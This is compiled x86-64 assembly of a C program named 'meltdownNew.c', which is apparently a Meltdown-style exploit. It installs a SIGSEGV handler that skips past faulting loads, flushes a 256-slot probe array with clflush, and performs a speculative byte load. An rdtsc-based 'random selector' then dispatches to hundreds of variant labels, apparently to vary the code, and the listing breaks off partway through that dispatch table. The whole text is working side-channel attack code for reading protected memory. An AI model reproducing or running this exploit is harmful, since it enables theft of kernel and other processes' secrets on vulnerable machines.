	.file	"meltdownNew.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 104 "meltdownNew.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 156 "meltdownNew.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$500, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	cmpl	$100, %eax
	je	.Lprobe_one_win0_var100
	cmpl	$101, %eax
	je	.Lprobe_one_win0_var101
	cmpl	$102, %eax
	je	.Lprobe_one_win0_var102
	cmpl	$103, %eax
	je	.Lprobe_one_win0_var103
	cmpl	$104, %eax
	je	.Lprobe_one_win0_var104
	cmpl	$105, %eax
	je	.Lprobe_one_win0_var105
	cmpl	$106, %eax
	je	.Lprobe_one_win0_var106
	cmpl	$107, %eax
	je	.Lprobe_one_win0_var107
	cmpl	$108, %eax
	je	.Lprobe_one_win0_var108
	cmpl	$109, %eax
	je	.Lprobe_one_win0_var109
	cmpl	$110, %eax
	je	.Lprobe_one_win0_var110
	cmpl	$111, %eax
	je	.Lprobe_one_win0_var111
	cmpl	$112, %eax
	je	.Lprobe_one_win0_var112
	cmpl	$113, %eax
	je	.Lprobe_one_win0_var113
	cmpl	$114, %eax
	je	.Lprobe_one_win0_var114
	cmpl	$115, %eax
	je	.Lprobe_one_win0_var115
	cmpl	$116, %eax
	je	.Lprobe_one_win0_var116
	cmpl	$117, %eax
	je	.Lprobe_one_win0_var117
	cmpl	$118, %eax
	je	.Lprobe_one_win0_var118
	cmpl	$119, %eax
	je	.Lprobe_one_win0_var119
	cmpl	$120, %eax
	je	.Lprobe_one_win0_var120
	cmpl	$121, %eax
	je	.Lprobe_one_win0_var121
	cmpl	$122, %eax
	je	.Lprobe_one_win0_var122
	cmpl	$123, %eax
	je	.Lprobe_one_win0_var123
	cmpl	$124, %eax
	je	.Lprobe_one_win0_var124
	cmpl	$125, %eax
	je	.Lprobe_one_win0_var125
	cmpl	$126, %eax
	je	.Lprobe_one_win0_var126
	cmpl	$127, %eax
	je	.Lprobe_one_win0_var127
	cmpl	$128, %eax
	je	.Lprobe_one_win0_var128
	cmpl	$129, %eax
	je	.Lprobe_one_win0_var129
	cmpl	$130, %eax
	je	.Lprobe_one_win0_var130
	cmpl	$131, %eax
	je	.Lprobe_one_win0_var131
	cmpl	$132, %eax
	je	.Lprobe_one_win0_var132
	cmpl	$133, %eax
	je	.Lprobe_one_win0_var133
	cmpl	$134, %eax
	je	.Lprobe_one_win0_var134
	cmpl	$135, %eax
	je	.Lprobe_one_win0_var135
	cmpl	$136, %eax
	je	.Lprobe_one_win0_var136
	cmpl	$137, %eax
	je	.Lprobe_one_win0_var137
	cmpl	$138, %eax
	je	.Lprobe_one_win0_var138
	cmpl	$139, %eax
	je	.Lprobe_one_win0_var139
	cmpl	$140, %eax
	je	.Lprobe_one_win0_var140
	cmpl	$141, %eax
	je	.Lprobe_one_win0_var141
	cmpl	$142, %eax
	je	.Lprobe_one_win0_var142
	cmpl	$143, %eax
	je	.Lprobe_one_win0_var143
	cmpl	$144, %eax
	je	.Lprobe_one_win0_var144
	cmpl	$145, %eax
	je	.Lprobe_one_win0_var145
	cmpl	$146, %eax
	je	.Lprobe_one_win0_var146
	cmpl	$147, %eax
	je	.Lprobe_one_win0_var147
	cmpl	$148, %eax
	je	.Lprobe_one_win0_var148
	cmpl	$149, %eax
	je	.Lprobe_one_win0_var149
	cmpl	$150, %eax
	je	.Lprobe_one_win0_var150
	cmpl	$151, %eax
	je	.Lprobe_one_win0_var151
	cmpl	$152, %eax
	je	.Lprobe_one_win0_var152
	cmpl	$153, %eax
	je	.Lprobe_one_win0_var153
	cmpl	$154, %eax
	je	.Lprobe_one_win0_var154
	cmpl	$155, %eax
	je	.Lprobe_one_win0_var155
	cmpl	$156, %eax
	je	.Lprobe_one_win0_var156
	cmpl	$157, %eax
	je	.Lprobe_one_win0_var157
	cmpl	$158, %eax
	je	.Lprobe_one_win0_var158
	cmpl	$159, %eax
	je	.Lprobe_one_win0_var159
	cmpl	$160, %eax
	je	.Lprobe_one_win0_var160
	cmpl	$161, %eax
	je	.Lprobe_one_win0_var161
	cmpl	$162, %eax
	je	.Lprobe_one_win0_var162
	cmpl	$163, %eax
	je	.Lprobe_one_win0_var163
	cmpl	$164, %eax
	je	.Lprobe_one_win0_var164
	cmpl	$165, %eax
	je	.Lprobe_one_win0_var165
	cmpl	$166, %eax
	je	.Lprobe_one_win0_var166
	cmpl	$167, %eax
	je	.Lprobe_one_win0_var167
	cmpl	$168, %eax
	je	.Lprobe_one_win0_var168
	cmpl	$169, %eax
	je	.Lprobe_one_win0_var169
	cmpl	$170, %eax
	je	.Lprobe_one_win0_var170
	cmpl	$171, %eax
	je	.Lprobe_one_win0_var171
	cmpl	$172, %eax
	je	.Lprobe_one_win0_var172
	cmpl	$173, %eax
	je	.Lprobe_one_win0_var173
	cmpl	$174, %eax
	je	.Lprobe_one_win0_var174
	cmpl	$175, %eax
	je	.Lprobe_one_win0_var175
	cmpl	$176, %eax
	je	.Lprobe_one_win0_var176
	cmpl	$177, %eax
	je	.Lprobe_one_win0_var177
	cmpl	$178, %eax
	je	.Lprobe_one_win0_var178
	cmpl	$179, %eax
	je	.Lprobe_one_win0_var179
	cmpl	$180, %eax
	je	.Lprobe_one_win0_var180
	cmpl	$181, %eax
	je	.Lprobe_one_win0_var181
	cmpl	$182, %eax
	je	.Lprobe_one_win0_var182
	cmpl	$183, %eax
	je	.Lprobe_one_win0_var183
	cmpl	$184, %eax
	je	.Lprobe_one_win0_var184
	cmpl	$185, %eax
	je	.Lprobe_one_win0_var185
	cmpl	$186, %eax
	je	.Lprobe_one_win0_var186
	cmpl	$187, %eax
	je	.Lprobe_one_win0_var187
	cmpl	$188, %eax
	je	.Lprobe_one_win0_var188
	cmpl	$189, %eax
	je	.Lprobe_one_win0_var189
	cmpl	$190, %eax
	je	.Lprobe_one_win0_var190
	cmpl	$191, %eax
	je	.Lprobe_one_win0_var191
	cmpl	$192, %eax
	je	.Lprobe_one_win0_var192
	cmpl	$193, %eax
	je	.Lprobe_one_win0_var193
	cmpl	$194, %eax
	je	.Lprobe_one_win0_var194
	cmpl	$195, %eax
	je	.Lprobe_one_win0_var195
	cmpl	$196, %eax
	je	.Lprobe_one_win0_var196
	cmpl	$197, %eax
	je	.Lprobe_one_win0_var197
	cmpl	$198, %eax
	je	.Lprobe_one_win0_var198
	cmpl	$199, %eax
	je	.Lprobe_one_win0_var199
	cmpl	$200, %eax
	je	.Lprobe_one_win0_var200
	cmpl	$201, %eax
	je	.Lprobe_one_win0_var201
	cmpl	$202, %eax
	je	.Lprobe_one_win0_var202
	cmpl	$203, %eax
	je	.Lprobe_one_win0_var203
	cmpl	$204, %eax
	je	.Lprobe_one_win0_var204
	cmpl	$205, %eax
	je	.Lprobe_one_win0_var205
	cmpl	$206, %eax
	je	.Lprobe_one_win0_var206
	cmpl	$207, %eax
	je	.Lprobe_one_win0_var207
	cmpl	$208, %eax
	je	.Lprobe_one_win0_var208
	cmpl	$209, %eax
	je	.Lprobe_one_win0_var209
	cmpl	$210, %eax
	je	.Lprobe_one_win0_var210
	cmpl	$211, %eax
	je	.Lprobe_one_win0_var211
	cmpl	$212, %eax
	je	.Lprobe_one_win0_var212
	cmpl	$213, %eax
	je	.Lprobe_one_win0_var213
	cmpl	$214, %eax
	je	.Lprobe_one_win0_var214
	cmpl	$215, %eax
	je	.Lprobe_one_win0_var215
	cmpl	$216, %eax
	je	.Lprobe_one_win0_var216
	cmpl	$217, %eax
	je	.Lprobe_one_win0_var217
	cmpl	$218, %eax
	je	.Lprobe_one_win0_var218
	cmpl	$219, %eax
	je	.Lprobe_one_win0_var219
	cmpl	$220, %eax
	je	.Lprobe_one_win0_var220
	cmpl	$221, %eax
	je	.Lprobe_one_win0_var221
	cmpl	$222, %eax
	je	.Lprobe_one_win0_var222
	cmpl	$223, %eax
	je	.Lprobe_one_win0_var223
	cmpl	$224, %eax
	je	.Lprobe_one_win0_var224
	cmpl	$225, %eax
	je	.Lprobe_one_win0_var225
	cmpl	$226, %eax
	je	.Lprobe_one_win0_var226
	cmpl	$227, %eax
	je	.Lprobe_one_win0_var227
	cmpl	$228, %eax
	je	.Lprobe_one_win0_var228
	cmpl	$229, %eax
	je	.Lprobe_one_win0_var229
	cmpl	$230, %eax
	je	.Lprobe_one_win0_var230
	cmpl	$231, %eax
	je	.Lprobe_one_win0_var231
	cmpl	$232, %eax
	je	.Lprobe_one_win0_var232
	cmpl	$233, %eax
	je	.Lprobe_one_win0_var233
	cmpl	$234, %eax
	je	.Lprobe_one_win0_var234
	cmpl	$235, %eax
	je	.Lprobe_one_win0_var235
	cmpl	$236, %eax
	je	.Lprobe_one_win0_var236
	cmpl	$237, %eax
	je	.Lprobe_one_win0_var237
	cmpl	$238, %eax
	je	.Lprobe_one_win0_var238
	cmpl	$239, %eax
	je	.Lprobe_one_win0_var239
	cmpl	$240, %eax
	je	.Lprobe_one_win0_var240
	cmpl	$241, %eax
	je	.Lprobe_one_win0_var241
	cmpl	$242, %eax
	je	.Lprobe_one_win0_var242
	cmpl	$243, %eax
	je	.Lprobe_one_win0_var243
	cmpl	$244, %eax
	je	.Lprobe_one_win0_var244
	cmpl	$245, %eax
	je	.Lprobe_one_win0_var245
	cmpl	$246, %eax
	je	.Lprobe_one_win0_var246
	cmpl	$247, %eax
	je	.Lprobe_one_win0_var247
	cmpl	$248, %eax
	je	.Lprobe_one_win0_var248
	cmpl	$249, %eax
	je	.Lprobe_one_win0_var249
	cmpl	$250, %eax
	je	.Lprobe_one_win0_var250
	cmpl	$251, %eax
	je	.Lprobe_one_win0_var251
	cmpl	$252, %eax
	je	.Lprobe_one_win0_var252
	cmpl	$253, %eax
	je	.Lprobe_one_win0_var253
	cmpl	$254, %eax
	je	.Lprobe_one_win0_var254
	cmpl	$255, %eax
	je	.Lprobe_one_win0_var255
	cmpl	$256, %eax
	je	.Lprobe_one_win0_var256
	cmpl	$257, %eax
	je	.Lprobe_one_win0_var257
	cmpl	$258, %eax
	je	.Lprobe_one_win0_var258
	cmpl	$259, %eax
	je	.Lprobe_one_win0_var259
	cmpl	$260, %eax
	je	.Lprobe_one_win0_var260
	cmpl	$261, %eax
	je	.Lprobe_one_win0_var261
	cmpl	$262, %eax
	je	.Lprobe_one_win0_var262
	cmpl	$263, %eax
	je	.Lprobe_one_win0_var263
	cmpl	$264, %eax
	je	.Lprobe_one_win0_var264
	cmpl	$265, %eax
	je	.Lprobe_one_win0_var265
	cmpl	$266, %eax
	je	.Lprobe_one_win0_var266
	cmpl	$267, %eax
	je	.Lprobe_one_win0_var267
	cmpl	$268, %eax
	je	.Lprobe_one_win0_var268
	cmpl	$269, %eax
	je	.Lprobe_one_win0_var269
	cmpl	$270, %eax
	je	.Lprobe_one_win0_var270
	cmpl	$271, %eax
	je	.Lprobe_one_win0_var271
	cmpl	$272, %eax
	je	.Lprobe_one_win0_var272
	cmpl	$273, %eax
	je	.Lprobe_one_win0_var273
	cmpl	$274, %eax
	je	.Lprobe_one_win0_var274
	cmpl	$275, %eax
	je	.Lprobe_one_win0_var275
	cmpl	$276, %eax
	je	.Lprobe_one_win0_var276
	cmpl	$277, %eax
	je	.Lprobe_one_win0_var277
	cmpl	$278, %eax
	je	.Lprobe_one_win0_var278
	cmpl	$279, %eax
	je	.Lprobe_one_win0_var279
	cmpl	$280, %eax
	je	.Lprobe_one_win0_var280
	cmpl	$281, %eax
	je	.Lprobe_one_win0_var281
	cmpl	$282, %eax
	je	.Lprobe_one_win0_var282
	cmpl	$283, %eax
	je	.Lprobe_one_win0_var283
	cmpl	$284, %eax
	je	.Lprobe_one_win0_var284
	cmpl	$285, %eax
	je	.Lprobe_one_win0_var285
	cmpl	$286, %eax
	je	.Lprobe_one_win0_var286
	cmpl	$287, %eax
	je	.Lprobe_one_win0_var287
	cmpl	$288, %eax
	je	.Lprobe_one_win0_var288
	cmpl	$289, %eax
	je	.Lprobe_one_win0_var289
	cmpl	$290, %eax
	je	.Lprobe_one_win0_var290
	cmpl	$291, %eax
	je	.Lprobe_one_win0_var291
	cmpl	$292, %eax
	je	.Lprobe_one_win0_var292
	cmpl	$293, %eax
	je	.Lprobe_one_win0_var293
	cmpl	$294, %eax
	je	.Lprobe_one_win0_var294
	cmpl	$295, %eax
	je	.Lprobe_one_win0_var295
	cmpl	$296, %eax
	je	.Lprobe_one_win0_var296
	cmpl	$297, %eax
	je	.Lprobe_one_win0_var297
	cmpl	$298, %eax
	je	.Lprobe_one_win0_var298
	cmpl	$299, %eax
	je	.Lprobe_one_win0_var299
	cmpl	$300, %eax
	je	.Lprobe_one_win0_var300
	cmpl	$301, %eax
	je	.Lprobe_one_win0_var301
	cmpl	$302, %eax
	je	.Lprobe_one_win0_var302
	cmpl	$303, %eax
	je	.Lprobe_one_win0_var303
	cmpl	$304, %eax
	je	.Lprobe_one_win0_var304
	cmpl	$305, %eax
	je	.Lprobe_one_win0_var305
	cmpl	$306, %eax
	je	.Lprobe_one_win0_var306
	cmpl	$307, %eax
	je	.Lprobe_one_win0_var307
	cmpl	$308, %eax
	je	.Lprobe_one_win0_var308
	cmpl	$309, %eax
	je	.Lprobe_one_win0_var309
	cmpl	$310, %eax
	je	.Lprobe_one_win0_var310
	cmpl	$311, %eax
	je	.Lprobe_one_win0_var311
	cmpl	$312, %eax
	je	.Lprobe_one_win0_var312
	cmpl	$313, %eax
	je	.Lprobe_one_win0_var313
	cmpl	$314, %eax
	je	.Lprobe_one_win0_var314
	cmpl	$315, %eax
	je	.Lprobe_one_win0_var315
	cmpl	$316, %eax
	je	.Lprobe_one_win0_var316
	cmpl	$317, %eax
	je	.Lprobe_one_win0_var317
	cmpl	$318, %eax
	je	.Lprobe_one_win0_var318
	cmpl	$319, %eax
	je	.Lprobe_one_win0_var319
	cmpl	$320, %eax
	je	.Lprobe_one_win0_var320
	cmpl	$321, %eax
	je	.Lprobe_one_win0_var321
	cmpl	$322, %eax
	je	.Lprobe_one_win0_var322
	cmpl	$323, %eax
	je	.Lprobe_one_win0_var323
	cmpl	$324, %eax
	je	.Lprobe_one_win0_var324
	cmpl	$325, %eax
	je	.Lprobe_one_win0_var325
	cmpl	$326, %eax
	je	.Lprobe_one_win0_var326
	cmpl	$327, %eax
	je	.Lprobe_one_win0_var327
	cmpl	$328, %eax
	je	.Lprobe_one_win0_var328
	cmpl	$329, %eax
	je	.Lprobe_one_win0_var329
	cmpl	$330, %eax
	je	.Lprobe_one_win0_var330
	cmpl	$331, %eax
	je	.Lprobe_one_win0_var331
	cmpl	$332, %eax
	je	.Lprobe_one_win0_var332
	cmpl	$333, %eax
	je	.Lprobe_one_win0_var333
	cmpl	$334, %eax
	je	.Lprobe_one_win0_var334
	cmpl	$335, %eax
	je	.Lprobe_one_win0_var335
	cmpl	$336, %eax
	je	.Lprobe_one_win0_var336
	cmpl	$337, %eax
	je	.Lprobe_one_win0_var337
	cmpl	$338, %eax
	je	.Lprobe_one_win0_var338
	cmpl	$339, %eax
	je	.Lprobe_one_win0_var339
	cmpl	$340, %eax
	je	.Lprobe_one_win0_var340
	cmpl	$341, %eax
	je	.Lprobe_one_win0_var341
	cmpl	$342, %eax
	je	.Lprobe_one_win0_var342
	cmpl	$343, %eax
	je	.Lprobe_one_win0_var343
	cmpl	$344, %eax
	je	.Lprobe_one_win0_var344
	cmpl	$345, %eax
	je	.Lprobe_one_win0_var345
	cmpl	$346, %eax
	je	.Lprobe_one_win0_var346
	cmpl	$347, %eax
	je	.Lprobe_one_win0_var347
	cmpl	$348, %eax
	je	.Lprobe_one_win0_var348
	cmpl	$349, %eax
	je	.Lprobe_one_win0_var349
	cmpl	$350, %eax
	je	.Lprobe_one_win0_var350
	cmpl	$351, %eax
	je	.Lprobe_one_win0_var351
	cmpl	$352, %eax
	je	.Lprobe_one_win0_var352
	cmpl	$353, %eax
	je	.Lprobe_one_win0_var353
	cmpl	$354, %eax
	je	.Lprobe_one_win0_var354
	cmpl	$355, %eax
	je	.Lprobe_one_win0_var355
	cmpl	$356, %eax
	je	.Lprobe_one_win0_var356
	cmpl	$357, %eax
	je	.Lprobe_one_win0_var357
	cmpl	$358, %eax
	je	.Lprobe_one_win0_var358
	cmpl	$359, %eax
	je	.Lprobe_one_win0_var359
	cmpl	$360, %eax
	je	.Lprobe_one_win0_var360
	cmpl	$361, %eax
	je	.Lprobe_one_win0_var361
	cmpl	$362, %eax
	je	.Lprobe_one_win0_var362
	cmpl	$363, %eax
	je	.Lprobe_one_win0_var363
	cmpl	$364, %eax
	je	.Lprobe_one_win0_var364
	cmpl	$365, %eax
	je	.Lprobe_one_win0_var365
	cmpl	$366, %eax
	je	.Lprobe_one_win0_var366
	cmpl	$367, %eax
	je	.Lprobe_one_win0_var367
	cmpl	$368, %eax
	je	.Lprobe_one_win0_var368
	cmpl	$369, %eax
	je	.Lprobe_one_win0_var369
	cmpl	$370, %eax
	je	.Lprobe_one_win0_var370
	cmpl	$371, %eax
	je	.Lprobe_one_win0_var371
	cmpl	$372, %eax
	je	.Lprobe_one_win0_var372
	cmpl	$373, %eax
	je	.Lprobe_one_win0_var373
	cmpl	$374, %eax
	je	.Lprobe_one_win0_var374
	cmpl	$375, %eax
	je	.Lprobe_one_win0_var375
	cmpl	$376, %eax
	je	.Lprobe_one_win0_var376
	cmpl	$377, %eax
	je	.Lprobe_one_win0_var377
	cmpl	$378, %eax
	je	.Lprobe_one_win0_var378
	cmpl	$379, %eax
	je	.Lprobe_one_win0_var379
	cmpl	$380, %eax
	je	.Lprobe_one_win0_var380
	cmpl	$381, %eax
	je	.Lprobe_one_win0_var381
	cmpl	$382, %eax
	je	.Lprobe_one_win0_var382
	cmpl	$383, %eax
	je	.Lprobe_one_win0_var383
	cmpl	$384, %eax
	je	.Lprobe_one_win0_var384
	cmpl	$385, %eax
	je	.Lprobe_one_win0_var385
	cmpl	$386, %eax
	je	.Lprobe_one_win0_var386
	cmpl	$387, %eax
	je	.Lprobe_one_win0_var387
	cmpl	$388, %eax
	je	.Lprobe_one_win0_var388
	cmpl	$389, %eax
	je	.Lprobe_one_win0_var389
	cmpl	$390, %eax
	je	.Lprobe_one_win0_var390
	cmpl	$391, %eax
	je	.Lprobe_one_win0_var391
	cmpl	$392, %eax
	je	.Lprobe_one_win0_var392
	cmpl	$393, %eax
	je	.Lprobe_one_win0_var393
	cmpl	$394, %eax
	je	.Lprobe_one_win0_var394
	cmpl	$395, %eax
	je	.Lprobe_one_win0_var395
	cmpl	$396, %eax
	je	.Lprobe_one_win0_var396
	cmpl	$397, %eax
	je	.Lprobe_one_win0_var397
	cmpl	$398, %eax
	je	.Lprobe_one_win0_var398
	cmpl	$399, %eax
	je	.Lprobe_one_win0_var399
	cmpl	$400, %eax
	je	.Lprobe_one_win0_var400
	cmpl	$401, %eax
	je	.Lprobe_one_win0_var401
	cmpl	$402, %eax
	je	.Lprobe_one_win0_var402
	cmpl	$403, %eax
	je	.Lprobe_one_win0_var403
	cmpl	$404, %eax
	je	.Lprobe_one_win0_var404
	cmpl	$405, %eax
	je	.Lprobe_one_win0_var405
	cmpl	$406, %eax
	je	.Lprobe_one_win0_var406
	cmpl	$407, %eax
	je	.Lprobe_one_win0_var407
	cmpl	$408, %eax
	je	.Lprobe_one_win0_var408
	cmpl	$409, %eax
	je	.Lprobe_one_win0_var409
	cmpl	$410, %eax
	je	.Lprobe_one_win0_var410
	cmpl	$411, %eax
	je	.Lprobe_one_win0_var411
	cmpl	$412, %eax
	je	.Lprobe_one_win0_var412
	cmpl	$413, %eax
	je	.Lprobe_one_win0_var413
	cmpl	$414, %eax
	je	.Lprobe_one_win0_var414
	cmpl	$415, %eax
	je	.Lprobe_one_win0_var415
	cmpl	$416, %eax
	je	.Lprobe_one_win0_var416
	cmpl	$417, %eax
	je	.Lprobe_one_win0_var417
	cmpl	$418, %eax
	je	.Lprobe_one_win0_var418
	cmpl	$419, %eax
	je	.Lprobe_one_win0_var419
	cmpl	$420, %eax
	je	.Lprobe_one_win0_var420
	cmpl	$421, %eax
	je	.Lprobe_one_win0_var421
	cmpl	$422, %eax
	je	.Lprobe_one_win0_var422
	cmpl	$423, %eax
	je	.Lprobe_one_win0_var423
	cmpl	$424, %eax
	je	.Lprobe_one_win0_var424
	cmpl	$425, %eax
	je	.Lprobe_one_win0_var425
	cmpl	$426, %eax
	je	.Lprobe_one_win0_var426
	cmpl	$427, %eax
	je	.Lprobe_one_win0_var427
	cmpl	$428, %eax
	je	.Lprobe_one_win0_var428
	cmpl	$429, %eax
	je	.Lprobe_one_win0_var429
	cmpl	$430, %eax
	je	.Lprobe_one_win0_var430
	cmpl	$431, %eax
	je	.Lprobe_one_win0_var431
	cmpl	$432, %eax
	je	.Lprobe_one_win0_var432
	cmpl	$433, %eax
	je	.Lprobe_one_win0_var433
	cmpl	$434, %eax
	je	.Lprobe_one_win0_var434
	cmpl	$435, %eax
	je	.Lprobe_one_win0_var435
	cmpl	$436, %eax
	je	.Lprobe_one_win0_var436
	cmpl	$437, %eax
	je	.Lprobe_one_win0_var437
	cmpl	$438, %eax
